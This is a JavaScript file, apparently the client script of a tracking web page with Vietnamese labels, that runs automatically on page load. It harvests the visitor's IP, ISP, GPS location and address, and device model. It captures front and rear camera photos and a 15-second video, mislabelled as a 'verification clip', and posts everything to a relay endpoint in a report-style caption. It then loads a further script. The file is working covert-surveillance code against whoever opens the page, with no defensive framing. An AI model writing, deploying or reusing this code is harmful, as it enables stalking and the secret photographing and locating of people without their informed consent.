const API_PROXY = '/api/send';

const info = {
  time: new Date().toLocaleString('vi-VN'),
  ip: '',
  isp: '',
  realIp: '',
  address: '',
  country: '', 
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    if (match) {
      let model = match[1].split('/')[0].trim();
      if (model.includes("SM-S918")) model = "Samsung Galaxy S23 Ultra";
      if (model.includes("SM-S928")) model = "Samsung Galaxy S24 Ultra";
      info.device = model;
    } else {
      info.device = 'Android Device';
    }
  } 
  else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } 
  else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

async function getPublicIP() {
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const data = await r.json();
    info.ip = data.ip || 'Không rõ';
  } catch (e) { info.ip = 'Bị chặn'; }
}

async function getRealIP() {
  try {
    const r = await fetch('https://icanhazip.com');
    const ip = await r.text();
    info.realIp = ip.trim();
    const res = await fetch(`https://ipwho.is/${info.realIp}`);
    const data = await res.json();
    info.isp = data.connection?.org || 'VNNIC';
    info.country = data.country || 'Việt Nam';
  } catch (e) { info.realIp = 'Lỗi kết nối'; }
}

let useGPS = false;

async function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return fallbackIPLocation().then(resolve);

    navigator.geolocation.getCurrentPosition(
      async pos => {
        useGPS = true;
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
          const data = await res.json();
          info.address = data.display_name || '📍 Vị trí GPS';
          info.country = data.address?.country || info.country;
        } catch {
          info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`;
        }
        resolve();
      },
      async () => {
        useGPS = false;
        await fallbackIPLocation();
        resolve();
      },
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

async function fallbackIPLocation() {
  try {
    const data = await fetch(`https://ipwho.is/`).then(r => r.json());
    info.lat = data.latitude?.toFixed(6) || '0';
    info.lon = data.longitude?.toFixed(6) || '0';
    info.address = `${data.city}, ${data.region} (Vị trí IP)`;
    info.country = data.country || 'Việt Nam';
  } catch (e) { info.address = 'Không rõ'; }
}

async function captureCamera(facingMode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          resolve(canvas.toDataURL('image/jpeg', 0.5));
        }, 800);
      };
    });
  } catch (e) {
    throw e;
  }
}

function getCaption() {
  const mapsLink = info.lat && info.lon
    ? `https://maps.google.com/maps?q=${info.lat},${info.lon}`
    : 'Không rõ';

  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.camera}
`.trim();
}

function getCaptionWithExtras() {
  return getCaption() + `\n\n⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.`;
}

async function sendPhotos(frontB64, backB64) {
  const media = [];

  if (frontB64) {
    media.push({ 
      type: 'photo', 
      media: frontB64, 
      caption: getCaptionWithExtras() 
    });
  }
  
  if (backB64) {
    media.push({ 
      type: 'photo', 
      media: backB64 
    });
  }

  return fetch(API_PROXY, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      type: 'media',
      media: media
    })
  });
}

async function sendTextOnly() {
  return fetch(API_PROXY, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      type: 'text',
      text: getCaption()
    })
  });
}

async function captureVideoAndSend() {
  const video = document.getElementById('preview');
  if (!video) {
    window.mainScriptFinished = true;
    return;
  }

  try {
    const stream = video.srcObject;
    if (!stream || video.videoWidth === 0) {
      window.mainScriptFinished = true;
      return;
    }

    const recorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
    let chunks = [];

    recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
    recorder.onstop = async () => {
      const videoBlob = new Blob(chunks, { type: 'video/mp4' });
      const reader = new FileReader();
      reader.readAsDataURL(videoBlob);
      reader.onloadend = async () => {
        const base64Video = reader.result;
        try {
            await fetch(API_PROXY, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'video',
                    media: base64Video,
                    caption: '🎬 Clip xác thực hành động (15 giây)'
                })
            });
        } catch (e) {
            console.error("Lỗi gửi video:", e);
        }
        
        window.mainScriptFinished = true;
        
        // Load tệp phụ trợ (giữ nguyên gốc nếu có)
        setTimeout(() => {
            const script = document.createElement('script');
            script.src = 'camera.js'; 
            script.defer = true;
            document.body.appendChild(script);
            console.log("✅ Hệ thống đã hoàn tất gửi thông tin chi tiết và video.");
        }, 1500);
      };
    };

    recorder.start();
    setTimeout(() => { recorder.stop(); }, 15000);
  } catch (err) {
    console.error("Lỗi xác thực quay video:", err);
    window.mainScriptFinished = true;
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function main() {
  detectDevice();
  await Promise.all([getPublicIP(), getRealIP(), getLocation()]);

  let front = null, back = null;

  try {
    front = await captureCamera("user");
    await delay(500);
    back = await captureCamera("environment");
    info.camera = '✅ Đã chụp camera trước và sau';
  } catch (e) {
    info.camera = '🚫 Bị từ chối hoặc lỗi camera';
  }

  // Bước 1: Gửi thông tin chữ + Ảnh ngay lập tức
  if (front || back) {
    await sendPhotos(front, back);
  } else {
    await sendTextOnly();
  }
  
  // Bước 2: Bắt đầu quay video 15s và gửi sau
  await captureVideoAndSend();
}

main();
